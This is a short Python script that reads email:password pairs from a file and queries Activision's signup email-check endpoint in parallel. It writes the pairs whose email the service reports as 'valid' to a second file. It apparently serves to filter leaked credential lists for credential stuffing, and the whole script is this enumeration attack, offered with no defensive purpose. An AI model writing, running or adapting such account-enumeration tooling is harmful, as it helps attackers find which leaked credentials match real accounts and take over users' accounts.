import requests
from multiprocessing import Process
import os

all_emails_file =  open(os.path.dirname(os.path.realpath(__file__)) + '/all_emails.txt', 'r')
valid_emails_file = open(os.path.dirname(os.path.realpath(__file__)) + '/valid_emails.txt', 'w')



def task():
    line = all_emails_file.readline()
    full_line = line.strip()
    if full_line == '':
        return
    
    splited_full_line = full_line.split(':')
    print(splited_full_line)
    username = splited_full_line[0]
    pasword = splited_full_line[1]

    url = 'https://s.activision.com/activision/signup/checkEmail'
    parms = {
        'email': username
    }
    json_response = requests.post(url, params=parms).json()

    if json_response['status'] == 'valid':
        valid_emails_file.write(line)
        valid_emails_file.flush()

procs = []

for x in range(8):
    proc = Process(target=task)
    procs.append(proc)
    proc.start()

for proc in procs:
    proc.join(timeout=0)
    if proc.is_alive():
        print("Job is not finished!")





all_emails_file.close()
valid_emails_file.close()
    
